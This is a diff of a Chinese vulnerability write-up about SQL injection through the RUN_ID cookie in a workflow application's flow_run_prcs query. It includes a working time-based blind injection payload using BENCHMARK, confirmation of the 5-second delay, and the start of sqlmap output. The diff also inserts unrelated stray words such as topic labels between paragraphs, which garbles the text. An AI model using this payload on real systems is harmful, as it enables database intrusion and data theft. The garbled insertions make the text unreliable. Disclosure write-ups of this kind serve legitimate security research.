@@ -33,6 +33,14 @@ $sql = "\r\n        SELECT PRCS_ID FROM flow_run_prcs \r\n\t\t   WHERE RUN_ID=".
 $res = exequery( $connection, $sql );
 ```
 
+深入探索
+
+计算机安全
+
+业务流程
+
+网络
+
 `RUN_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
 # 漏洞复现
@@ -47,9 +55,17 @@ Cookie: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
 
 成功在延时 5 秒
 
-[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
+编程
+
+深入探索
+
+数据管理
 
 编程
+
+软件
+
+[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
 
 ```
 sqlmap identified the following injection point(s) with a total of 378 HTTP(s) requests:
